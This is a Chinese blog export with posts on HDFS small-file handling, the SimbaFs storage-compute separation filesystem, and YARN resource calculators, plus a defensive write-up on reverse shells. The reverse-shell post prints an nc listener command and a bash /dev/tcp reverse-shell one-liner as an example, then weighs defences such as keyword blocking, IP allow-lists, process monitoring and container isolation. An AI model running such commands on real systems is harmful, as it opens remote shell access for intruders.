<h2 id="从写入端控制文件数量"><a href="#从写入端控制文件数量" class="headerlink" title="从写入端控制文件数量"></a>从写入端控制文件数量</h2><p>写入端需要让“分区数据量、并行度、目标文件大小”能够对应起来，单纯追求更大的文件没有意义。</p>
<p>批任务中，如果一个日分区只有几百 MB，却因为上游并行度沿用默认值输出几十个文件，我会先收敛输出并行度。若数据按大量动态分区写入，还要检查业务是否真的需要这么细的分区。把低基数日期再切到小时、渠道、地区，目录数量和文件数量会一起放大。</p>
<p>流任务不能简单把并行度降到 1。并行度首先服务吞吐与故障恢复，文件大小应由 sink 的滚动策略、分桶方式和提交周期共同控制。滚动太频繁会产生小文件，滚动太慢又会增加恢复成本和数据可见延迟。这个取舍需要用实际每个并发分支的流量来算，而不是从集群 block size 反推一个统一参数。</p>
<p>平台层最好在任务发布时给出估算：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">预计单文件大小 ≈ 分区周期内数据量 / 实际写入分支数</span><br><span class="line">实际写入分支数 = 并行度 × 同时命中的分区或桶数量</span><br></pre></td></tr></table></figure>

<p>这个公式不追求精确，它的价值是提前暴露数量级错误。预计每个文件只有几百 KB 时，发布页面就应该提示用户检查分区与并行度，而不是等 NameNode 报警以后再治理。</p>
<h2 id="concat-不是通用压缩工具"><a href="#concat-不是通用压缩工具" class="headerlink" title="concat 不是通用压缩工具"></a><code>concat</code> 不是通用压缩工具</h2><p>HDFS 的 <code>concat</code> 很容易被理解成“把几个文件重新写成一个”。从 <code>FSDirConcatOp</code> 看，它实际调用 <code>INodeFile.concatBlocks()</code>，把源文件的 block 接到目标 inode 上，然后移除源 inode。数据 block 不需要重新经过客户端读取和写入，所以操作很快。</p>
<p>也正因为它是在元数据层拼 block，限制不少：源文件和目标文件必须在同一目录；源文件不能处于 snapshot 中，不能与目标相同，不能是空文件或正在写入；源文件的 preferred block size 不能大于目标文件；加密区也不允许执行。源码还会检查纠删码策略等属性是否匹配。</p>
<p>更重要的是，<code>concat</code> 不理解 Parquet、ORC 或文本记录的文件格式语义。它只是拼 block，不会重新编码数据、整理 stripe&#x2F;row group，也不会更新 Hive 分区统计信息。拿它代替表文件 compaction，必须先证明目标文件格式允许这种物理拼接；不能因为 HDFS API 调用成功，就认为数据表一定可读。</p>
<p>对于需要真正减少文件并优化列式布局的表，我更倾向于用计算任务重写：读取旧分区，按目标文件大小重新分桶或合并，写入隔离的 staging 路径。它成本更高，但能走正常的序列化和文件格式 writer，验证边界也清楚。</p>
<h2 id="HAR-解决-namespace，不负责替你清理"><a href="#HAR-解决-namespace，不负责替你清理" class="headerlink" title="HAR 解决 namespace，不负责替你清理"></a>HAR 解决 namespace，不负责替你清理</h2><p>Hadoop Archives（HAR）会把一批逻辑文件映射到 <code>_index</code>、<code>_masterindex</code> 和 <code>part-*</code> 文件上，对外暴露 <code>har://</code> 文件系统视图。大量冷小文件进入 HAR 后，可以减少底层 HDFS namespace 中的文件与 block 数量。</p>
<p>但 HAR 是不可变的。归档中的 rename、delete 和 create 都会报错，不适合还在持续追加的热分区。官方文档还特意说明：创建 archive 不会删除输入文件。想真正减少 namespace，用户必须在验证 archive 后自行删除原文件。</p>
<p>这两点决定了 HAR 更像冷数据封装，而不是日常表 compaction。若归档完成后忘记删原目录，NameNode 压力不会下降，反而多了一份 archive；若先删再验，又把一次治理变成了数据恢复事故的入口。</p>
<p>我的做法是把 HAR 放在低频、只读、生命周期清楚的目录上，并明确记录原路径、archive 路径、文件数、总字节数和验证结果。在线查询表或仍会补数的分区，不会为了降低文件数直接做 HAR。</p>
<h2 id="存量改写必须有回滚点"><a href="#存量改写必须有回滚点" class="headerlink" title="存量改写必须有回滚点"></a>存量改写必须有回滚点</h2><p>存量小文件治理，本质上是一次数据迁移。即使数据在同一个 HDFS 集群，也要按迁移来做。</p>
<p>我会先冻结目标分区的写入或确认它已过补数窗口，然后把结果写入独立 staging 目录。校验至少包括文件格式可读、记录数、关键字段聚合、分区边界和总数据量；对金额、订单数这类核心指标，还要和原目录做业务口径对账。</p>
<p>通过以后再用 rename 切换目录：原目录改成带时间戳的备份名，staging 目录改成正式名。HDFS 的 rename 只处理 namespace，比跨集群复制更适合做短时间切换。备份目录保留一个明确的观察窗口，确认下游任务连续运行正常后再删除。</p>
<p>失败时也要知道停在哪一步。staging 校验失败，删 staging 并保留原目录；正式路径已切换但下游验证失败，就把新目录移开、原目录改回。不要在一个脚本里连续执行“合并、覆盖、删除”，中间没有状态记录，出了问题只能翻日志猜文件还剩在哪里。</p>
<p>小文件治理是否结束，要看三个结果能否同时成立：生产任务不再按原速度制造小文件，存量数据经过验证完成切换，NameNode 和下游扫描指标都出现持续改善。历史目录少了多少文件只是过程数据。少了其中任何一个，夜间合并任务都只是把问题推迟到下一天。</p>
<h2 id="对照源码与文档"><a href="#对照源码与文档" class="headerlink" title="对照源码与文档"></a>对照源码与文档</h2><ul>
<li><a href="https://github.com/apache/hadoop/blob/aa96f1871bfd858f9bac59cf2a81ec470da649af/hadoop-hdfs-project/hadoop-hdfs/src/site/markdown/HdfsDesign.md#L52-L61">HDFS 3.3.0 架构文档：NameNode 管理 namespace 与 block 映射</a></li>
<li><a href="https://github.com/apache/hadoop/blob/aa96f1871bfd858f9bac59cf2a81ec470da649af/hadoop-hdfs-project/hadoop-hdfs/src/site/markdown/HdfsDesign.md#L146-L153">HDFS 3.3.0 架构文档：namespace 与 block map 保存在内存</a></li>
<li><a href="https://github.com/apache/hadoop/blob/aa96f1871bfd858f9bac59cf2a81ec470da649af/hadoop-hdfs-project/hadoop-hdfs/src/main/java/org/apache/hadoop/hdfs/server/namenode/FSDirConcatOp.java#L39-L47"><code>FSDirConcatOp</code>：concat 的限制与检查</a></li>
<li><a href="https://github.com/apache/hadoop/blob/aa96f1871bfd858f9bac59cf2a81ec470da649af/hadoop-hdfs-project/hadoop-hdfs/src/main/java/org/apache/hadoop/hdfs/server/namenode/FSDirConcatOp.java#L230-L263"><code>FSDirConcatOp.unprotectedConcat()</code>：拼接 block 并移除源文件</a></li>
<li><a href="https://github.com/apache/hadoop/blob/aa96f1871bfd858f9bac59cf2a81ec470da649af/hadoop-tools/hadoop-archives/src/site/markdown/HadoopArchives.md.vm#L30-L36">Hadoop Archives：HAR 的结构与不可变约束</a></li>
<li><a href="https://github.com/apache/hadoop/blob/aa96f1871bfd858f9bac59cf2a81ec470da649af/hadoop-tools/hadoop-archives/src/site/markdown/HadoopArchives.md.vm#L69-L72">Hadoop Archives：创建归档不会删除原文件</a></li>
<li><a href="https://hadoop.apache.org/release/3.3.0.html">Apache Hadoop 3.3.0 发布说明</a></li>
</ul>
]]></content>
      <categories>
        <category>大数据平台</category>
      </categories>
      <tags>
        <tag>HDFS</tag>
        <tag>小文件治理</tag>
        <tag>数据平台</tag>
      </tags>
  </entry>
  <entry>
    <title>10分钟了解SimbaFs解决hadoop存算分离问题</title>
    <url>//2021/04/12/10%E5%88%86%E9%92%9F%E4%BA%86%E8%A7%A3SimbaFs%E8%A7%A3%E5%86%B3hadoop%E5%AD%98%E7%AE%97%E5%88%86%E7%A6%BB%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><p>    众所周知传统的 Apache Hadoop 的架构存储和计算是耦合在一起的, HDFS 作为其分布式文件系统也面临一些问题。如: 存储空间或者计算资源不足两者只能同时扩容、扩容效率低、额外增加成本、灵活性差等。本文会大家回顾Hadoop的传统架构来分析上述问题以及Hadoop实现存算分离的方案和DataSimba的对于Hadoop存算分离的最佳实践。</p>
<h3 id="二、Hadoop分布式文件系统-HDFS-的架构和问题"><a href="#二、Hadoop分布式文件系统-HDFS-的架构和问题" class="headerlink" title="二、Hadoop分布式文件系统(HDFS)的架构和问题"></a>二、Hadoop分布式文件系统(HDFS)的架构和问题</h3><p>    <strong>HDFS的架构:</strong><br><img src="/images/recovered/hdfs-architecture.gif" class="lazyload" data-srcset="/images/recovered/hdfs-architecture.gif" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" loading="lazy" alt="image" /></p>
<p>    HDFS采用master&#x2F;slave架构。一个HDFS集群是由一个Namenode和一定数目的Datanodes组成。</p>
<ul>
<li>Namenode:<ol>
<li>Namenode是一个中心服务器，负责管理文件系统的名字空间(namespace)以及客户端对文件的访问</li>
<li>Namenode执行文件系统的名字空间操作，比如打开、关闭、重命名文件或目录。它也负责确定数据块到具体Datanode节点的映射。</li>
</ol>
</li>
<li>Datanode:<ol>
<li>集群中的Datanode一般是一个节点一个，负责管理它所在节点上的存储。</li>
<li>HDFS暴露了文件系统的名字空间，用户能够以文件的形式在上面存储数据。从内部看，一个文件其实被分成一个或多个数据块，这些块存储在一组Datanode上。</li>
<li>Datanode负责处理文件系统客户端的读写请求。在Namenode的统一调度下进行数据块的创建、删除和复制。</li>
</ol>
</li>
<li>Client:<ol>
<li>用户操作HDFS文件进行创建、删除、移动或重命名操作的客户端。</li>
</ol>
</li>
</ul>
<hr>
<p>    <strong>Hadoop分布式文件系统的设计目标:</strong></p>
<ul>
<li>适合运行在通用硬件和廉价机器(commodity hardware)上的分布式文件系统</li>
<li>机器的硬件错误常的态化,让HDFS具有错误检测和快速、自动的恢复能力是最核心的架构目标</li>
<li>数据批处理关键的在于数据访问的高吞吐量,而POSIX标准设置的很多硬性约束对HDFS应用系统不是必需的。为了提高数据的吞吐量，在一些关键方面对POSIX的语义做了一些修改。</li>
<li>HDFS应用一次写入多次读取”的文件访问简单一致性模型</li>
<li>移动计算的思想: 进行一次请求计算数据距离越近就越高效,在海量数据处理下hadoop将计算逻辑移动到存储节点。</li>
<li>数据切分成块、数据复制副本(容错)、数据副本分布策略、机架感知、副本选择等特性来保证hdfs可靠性和提高性能的关键。</li>
<li>Datanode节点周期性地向Namenode发送心跳信号、负载均衡策略、HDFS文件内容的校验和(checksum)检查保证HDFS的健壮性和可靠性。</li>
</ul>
<hr>
<p>    <strong>Hadoop分布式文件系统的问题:</strong></p>
<ul>
<li>计算存储耦合:<br>上面说过HDFS采用移动计算的思想,计算的时候只需要将计算代码推送到存储节点上,即可在存储节点上完成数据本地化计算，Hadoop 中的集群存储节点也是计算节点。所以当存储空间或计算资源不足时，只能同时对两者进行扩容。如果用户的计算需求远远大于存储需求,此时扩容集群会造成存储的浪费,相反则计算资源被浪费。</li>
<li>扩容问题:<br>集群节点增多,扩容成本增加,风险增加</li>
<li>HDFS性能问题:<br>HDFS NameNode的全局锁虽然简化了锁模型降低了复杂度,但是全局锁最大的缺点就是容易产生性能瓶颈</li>
<li>HDFS成本问题:<br>在HDFS文件系统中典型文件大小一般都在G字节至T字节,由于HDFS的副本特性一份文件至少会存储3份,这些额外的空间会带来存储成本额外的提高</li>
</ul>
<blockquote>
<p>针对上面一些问题,现在Hadoop采用存算分离的架构的方案趋势越来越明显</p>
</blockquote>
<hr>
<h3 id="三、Hadoop-实现存算分离方案"><a href="#三、Hadoop-实现存算分离方案" class="headerlink" title="三、Hadoop 实现存算分离方案:"></a>三、<strong>Hadoop 实现存算分离方案:</strong></h3><ul>
<li>方案一: Hadoop 兼容的文件系统:</li>
</ul>
<figure class="legacy-image-notice" data-original-src="http://dmr-blog.oss-accelerate.aliyuncs.com/hadoop%20%E5%85%BC%E5%AE%B9%E7%9A%84%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image" />
<figcaption><strong>旧站配图 2 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<p><br>    上图是Hadoop3.X 目前兼容的文件系统,支持aws s3、腾讯云 cos、阿里云 oss存储,可以看到用户在上传数据时候,需要调用对应云服务厂商的sdk进行数据的写入。下载文件也是一样的原理。不过为什么现在可以使用这种方式实现Hadoop的计算存储分离呢？</p>
<p>    举一个例子日常生活中遇到的经历：家里带宽自从升级到100mpbs，从来不保存电影，要看直接下载，基本几分钟就好了。这在几年前不可想象。</p>
<blockquote>
<p>带宽的速度，特别是机房内带宽的速度，已经从1000mps、2000mps、10000mps，甚至100000mpbs。但是磁盘的速度基本没有太大的变化。因为硬件的变化，带来了软件架构的变化。</p>
</blockquote>
<p>    虽然方案一可以实现计算存储分离,但是基本架构上还是存在问题:虽然带宽增加,但是如果Hadoop集群机房和对应的对象存储机房距离较远,网络抖动等原因加大了传输失败的几率,还有比如判断一个目录需要多次的refs请求才能完成操作,多次请求会对性能造成影响。</p>
<ul>
<li>方案二: 云原生的Hadoop文件系统 SimbaFs:</li>
</ul>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/simbaFs%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image" />
<figcaption><strong>旧站配图 3 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<p><br>    上图是SimbaFs的架构,SimbaFsClient是一个java开发的jar包,兼容Hadoop文件系统，按照Hadoop FileSystem API规范来实现。主要实现了Hadoop FileSystem的list、delete、rename、mkdir等接口，而InputStream和OutputStream主要实现了对文件读写优化相的等实现(预读、缓存读、异步写、批量写、文件压缩)。SimbaFs client通过JNI (Java Native Interface) 技术转换为本地simbafs.so的调用实现相关方法,完成文件的上传&#x2F;下载操作。</p>
<ul>
<li>压测情况:</li>
</ul>
<p>    由于对于读做了预读和缓存操作,对于写的操作通过异步写和批量写的优化所以SimbaFs的性能也是非常优秀的。我们在发行版本为cdh5的集群, hdfs版本为2.6做了测试。使用3台阿里云4核14g的ecs做压力测试,对象存储选择的是oss,并且保证集群节点和oss在同一机房。下面是关于create_write、open_read、rename、delete 等操作的压测结果。\</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/open_read%20%E5%90%9E%E5%90%90%E9%87%8F%E5%AF%B9%E6%AF%94.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image" />
<figcaption><strong>旧站配图 4 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<p>\</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/create_write%20%E5%90%9E%E5%90%90%E9%87%8F%E5%AF%B9%E6%AF%94.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image" />
<figcaption><strong>旧站配图 5 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<p>\</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/rename%20%E5%90%9E%E5%90%90%E9%87%8F%E5%AF%B9%E6%AF%94.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image" />
<figcaption><strong>旧站配图 6 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<p>\</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/delete%20%E5%90%9E%E5%90%90%E9%87%8F%E5%AF%B9%E6%AF%94.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image" />
<figcaption><strong>旧站配图 7 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<blockquote>
<p>可以看到SimbaFs的性能在open_read、create_write、rename是远好于HDFS的</p>
</blockquote>
<h3 id="四、小节"><a href="#四、小节" class="headerlink" title="四、小节"></a>四、小节</h3><p>    本文先回顾了传统Hadoop分布式文件系统的架构和问题,以及实现Hadoop存算分离的方案,并详细介绍了DataSimba对存算分离的SimbaFs的实现原理和压测情况。最后真心希望本文对你所有帮助。</p>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>Hadoop</tag>
        <tag>计算存储分离</tag>
        <tag>云原生</tag>
      </tags>
  </entry>
  <entry>
    <title>shell反弹渗透技术分析和解决方案</title>
    <url>//2021/05/16/shell%E5%8F%8D%E5%BC%B9%E6%B8%97%E9%80%8F%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
    <content><![CDATA[<h1 id="一-背景"><a href="#一-背景" class="headerlink" title="一. 背景"></a>一. 背景</h1><p>  目前公司的产品的《命令行复测结果简报》中检测出反弹shell漏洞, 需要对该问题做出相关相关应对方案。</p>
<h1 id="二-反弹shell介绍"><a href="#二-反弹shell介绍" class="headerlink" title="二. 反弹shell介绍"></a>二. 反弹shell介绍</h1><p>  反弹shell(reverse shell)，就是控制端监听在某TCP&#x2F;UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制<br>端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的⻆色反转。<br>  例子:</p>
<ul>
<li><p>攻击者在其机器上监听端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 通过netcat工具监听 6767端口号(tcp/udp)并且输出交互信息</span><br><span class="line"> nc -lvp 6767</span><br></pre></td></tr></table></figure>
</li>
<li><p>在被攻击端执行下面命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//产生一个交互的shell 并且建立socket连接读取这个文件</span><br><span class="line"> bash -i &gt;&amp; /dev/tcp/公网ip/ 6767 0 &gt;&amp; 1</span><br></pre></td></tr></table></figure>

<p>\</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/image.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image" />
<figcaption><strong>旧站配图 1 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure></li>
</ul>
<h1 id="三-漏洞分析"><a href="#三-漏洞分析" class="headerlink" title="三. 漏洞分析"></a>三. 漏洞分析</h1><p>  该漏洞的核心思想是在被攻击节点建立socket通道连接外网打通攻击者服务器,从而实现渗透。用户可以通过Datasimba 执行<br>shell 、python、jar 实现shell反弹,分析该问题目前能想到的解决思路如下:</p>
<ul>
<li>限定被攻击节点对外访问请求；</li>
<li>监听 socket 通道的进程 发现即kill或报警</li>
<li>通过用户空间隔离技术(chroot)</li>
<li>通过容器虚拟化技术实现环境资源隔离<br>按照以上思路提供的解决方案</li>
</ul>
<h1 id="四-反弹shell防御方案"><a href="#四-反弹shell防御方案" class="headerlink" title="四. 反弹shell防御方案"></a>四. 反弹shell防御方案</h1><h5 id="方案一-产品功能对任务代码的关键字作限制"><a href="#方案一-产品功能对任务代码的关键字作限制" class="headerlink" title="方案一: 产品功能对任务代码的关键字作限制"></a>方案一: 产品功能对任务代码的关键字作限制</h5><ul>
<li>解释：代码中如果包含类似shell反弹的任务不能进行保存和运行</li>
<li>优点：从源头上避免反弹shell代码进入到产品服务内部</li>
<li>缺点：用户可以通过在代码中添加包含反弹shell的文件,或者通过下载外部文件的<br>方式绕过校验限制</li>
</ul>
<h5 id="方案二-对被攻击节点-增加-ip白名单限制外网访问"><a href="#方案二-对被攻击节点-增加-ip白名单限制外网访问" class="headerlink" title="方案二: 对被攻击节点 增加 ip白名单限制外网访问"></a>方案二: 对被攻击节点 增加 ip白名单限制外网访问</h5><ul>
<li>解释：<br>i. 目前Dataworkes(阿里云) 对于ip白名单 shell反弹的解决思路<br>ii. 目前有的客户就是使用禁止外网访问的方式避免掉的</li>
<li>优点：配置简单,从源头上解决问题,可以有效控制被攻击节点的ip</li>
<li>缺点：灵活性差,比如simba接入新的数据源,则数据源的ip需要添加到白名单中</li>
</ul>
<h5 id="方案三-自动防御shell反弹"><a href="#方案三-自动防御shell反弹" class="headerlink" title="方案三: 自动防御shell反弹"></a>方案三: 自动防御shell反弹</h5><ul>
<li>解释：通过linux IPC机制Netlink，用于在内核与用户进程之间传递消息,捕获进程事件信息，通过监控到的进程信息进行处理</li>
<li>优点：自动监控系统进程,发现非法进程直接kill,一般情况下绕过较难</li>
<li>缺点：i. 运维成本增加<br>ii. 通过上传可执行文件通过其他思路实现反弹,比如通过java或者python写一个SocketServer 程序执行.</li>
</ul>
<h5 id="方案四-通过容器虚拟化技术建立隔离操作系统"><a href="#方案四-通过容器虚拟化技术建立隔离操作系统" class="headerlink" title="方案四: 通过容器虚拟化技术建立隔离操作系统"></a>方案四: 通过容器虚拟化技术建立隔离操作系统</h5><ul>
<li>解释：<br>i.首先在产品的工作节点上通过docker技术创建出虚拟化的容器作为隔离层<br>ii.在功能中对于python、shell、jar任务类型在simba的工作节点上真正执行时我们会在隔离层<br>执行相关逻辑(只依赖其操作系统环境)。如果出现黑客攻击者通过shell反弹技术入侵其实操作的是虚拟出来的操作系统,不会对容器外<br>部的机器造成任何威胁。</li>
<li>优点: 通过容器虚拟化技术虚拟出新的操作系统实现完全的隔离。</li>
<li>缺点：对simba现有worker的工作节点进行架构优化改造，短时间内无法完成。</li>
</ul>
<h1 id="五-目前的思路"><a href="#五-目前的思路" class="headerlink" title="五. 目前的思路"></a>五. 目前的思路</h1><ul>
<li>思路一：通过方案二来从源头上解决问题(可能会增加额外的配置成本)</li>
<li>思路二: 可以通过方案一、方案三组合使用,通过方案一和方案三的优缺点进行互补,方案一从产品层面限制反弹<br>shell进入到产品平台,方案三可防止通过引用上传文件绕过的限制。可以避免大多数场景。理论上进入到产品平台的用户<br>大多数都是内部和已知用户都可以追溯和溯源(排除账号被盗问题)</li>
<li>思路三: 为了彻底解决非法用户通过编写其他技术方式实现所谓的’反弹’,后续会排期对产品的工作节点增加方案四-容器<br>虚拟化的方式来避免’反弹’问题。</li>
</ul>
]]></content>
      <categories>
        <category>未分类</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>YARN 队列有空闲资源为什么任务还在等：先看内存与 vCore 的资源形状</title>
    <url>//2021/03/18/yarn-queue-resource-shape/</url>
    <content><![CDATA[<p>YARN 页面显示队列还有容量，作业却长时间处于 ACCEPTED，或者 ApplicationMaster 已经启动、后续 Container 一直拿不到。遇到这种情况，只看“队列使用率 70%”往往不够。</p>
<p>调度器分配的不是一个抽象百分比，而是落到具体节点上的一组资源。任务要申请 8 GB 内存和 4 个 vCore，某个节点只剩 16 GB 内存但只有 2 个 vCore，这个节点对它仍然不可用。把所有节点的空闲内存相加，看起来还有很多容量，也不代表存在一个能容纳当前请求的节点。</p>
<p>还有一个更容易忽略的前提：CapacityScheduler 使用哪个 <code>ResourceCalculator</code>。Hadoop 3.3.0 默认的计算器只比较内存，切换到 <code>DominantResourceCalculator</code> 后，内存与 CPU 才以多维资源参与比较。两种模式下同一个“50% 队列”的含义并不完全相同。</p>
<p class="article-diagram-scroll"><img src="/images/articles/yarn-queue-resource-shape.svg" class="lazyload" data-srcset="/images/articles/yarn-queue-resource-shape.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="YARN 队列容量、请求形状与节点碎片"></p>
<span id="more"></span>

<h2 id="默认调度计算器只看内存"><a href="#默认调度计算器只看内存" class="headerlink" title="默认调度计算器只看内存"></a>默认调度计算器只看内存</h2><p><code>CapacitySchedulerConfiguration</code> 把 <code>DefaultResourceCalculator</code> 设为默认实现。继续看这个类，<code>compare()</code> 和 <code>computeAvailableContainers()</code> 都有同一句注释：<code>Only consider memory</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Resource unused, Resource lhs, Resource rhs,</span></span><br><span class="line"><span class="params">    <span class="type">boolean</span> singleType)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> Long.compare(lhs.getMemorySize(), rhs.getMemorySize());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">long</span> <span class="title function_">computeAvailableContainers</span><span class="params">(Resource available,</span></span><br><span class="line"><span class="params">    Resource required)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> available.getMemorySize() / required.getMemorySize();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这意味着默认模式下，队列占用比例、资源比较和可容纳 Container 数量主要按内存计算。配置里虽然仍有 <code>yarn.scheduler.minimum-allocation-vcores</code> 和 <code>maximum-allocation-vcores</code>，Container 请求也带 vCore，但不能由此推断队列公平性已经按 CPU 做了隔离。</p>
<p>这是很多“CPU 已经打满，队列看起来却没满”的根源。调度器按内存判断还有空间，节点上的进程却在争抢 CPU；或者某类作业申请了偏小的 vCore 数，资源声明与实际计算负载不匹配，队列指标仍然显得健康。</p>
<p>我排查时会先把这个配置抄出来，而不是从 UI 猜：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.scheduler.capacity.resource-calculator<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>org.apache.hadoop.yarn.util.resource.DefaultResourceCalculator<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果属性没有显式配置，也要按源码默认值理解，不能因为 capacity-scheduler.xml 里搜不到就当它不存在。</p>
<h2 id="DRF-看的是占比最高的那一维"><a href="#DRF-看的是占比最高的那一维" class="headerlink" title="DRF 看的是占比最高的那一维"></a>DRF 看的是占比最高的那一维</h2><p><code>DominantResourceCalculator</code> 使用 Dominant Resource Fairness 的思路。对一个用户或队列，分别计算已用内存占集群内存的比例、已用 CPU 占集群 CPU 的比例，取其中最大的一个作为 dominant share。</p>
<p>假设集群有 100 GB 内存和 100 个 vCore：</p>
<ul>
<li>队列 A 使用 40 GB、10 vCore，dominant share 是 40%；</li>
<li>队列 B 使用 20 GB、50 vCore，dominant share 是 50%。</li>
</ul>
<p>队列 A 的绝对 CPU 用量更低，但它的主导资源是内存；队列 B 的主导资源是 CPU。DRF 比较的是各自最紧张的维度，不是把内存与 CPU 简单相加。源码的 <code>ratio()</code> 也正是遍历可计数资源，返回各维比例的最大值。</p>
<p>这适合 CPU 型和内存型任务混跑的集群。不过切换计算器不是改一行配置就结束。原来只按内存设计的队列 capacity、用户限制和告警阈值都要重新验证；应用提交的 vCore 请求若长期失真，DRF 只会把错误声明纳入公平计算，不能自动识别真实 CPU 消耗。</p>
<p>我会先在历史运行数据上回放资源声明：按队列统计已分配内存、vCore 与节点实际 CPU 使用，找出“声明 1 core、长期吃满多个核”或“声明很大、实际长期空闲”的任务，再讨论是否启用 DRF。资源模型换得再正确，申请值不可信也没有用。</p>
<h2 id="最小分配会把请求向上取整"><a href="#最小分配会把请求向上取整" class="headerlink" title="最小分配会把请求向上取整"></a>最小分配会把请求向上取整</h2><p>YARN 对每个 Container 的资源请求有最小值与最大值。Hadoop 3.3.0 的默认配置中，内存最小 1024 MB、最大 8192 MB，vCore 最小 1、最大 4；生产环境通常会按机器规格重新配置。</p>
<p>低于最小值的请求会被抬到最小值，高于最大值则抛出 <code>InvalidResourceRequestException</code>。<code>DefaultResourceCalculator.normalize()</code> 还会依据 step factor 向上取整，并限制在最大值以内。</p>
<p>如果最小内存粒度设为 2 GB，一个只需要 600 MB 的轻量 Container 仍按 2 GB 分配。单个任务看不出问题，几百个短任务同时运行时，取整损耗会直接反映为可并发 Container 数下降。反过来，把粒度压得过小，会让调度对象更多，资源管理复杂度也上升。</p>
<p>所以最小分配不该沿用某份“最佳实践”模板。我会从实际 Container 请求分布开始，看 P50、P90 以及高频规格，再选择能覆盖主要请求、又不会产生明显取整浪费的粒度。内存与 vCore 要一起看，不能只优化其中一列。</p>
<p>每个队列还可以设置 <code>maximum-allocation-mb</code> 和 <code>maximum-allocation-vcores</code>，它们覆盖集群级上限，但不能超过集群上限。这个约束适合阻止普通批处理队列申请超大 Container，也可能让一个配置正确的大内存任务在提交阶段直接失败。排查时要同时检查集群级和队列级上限。</p>
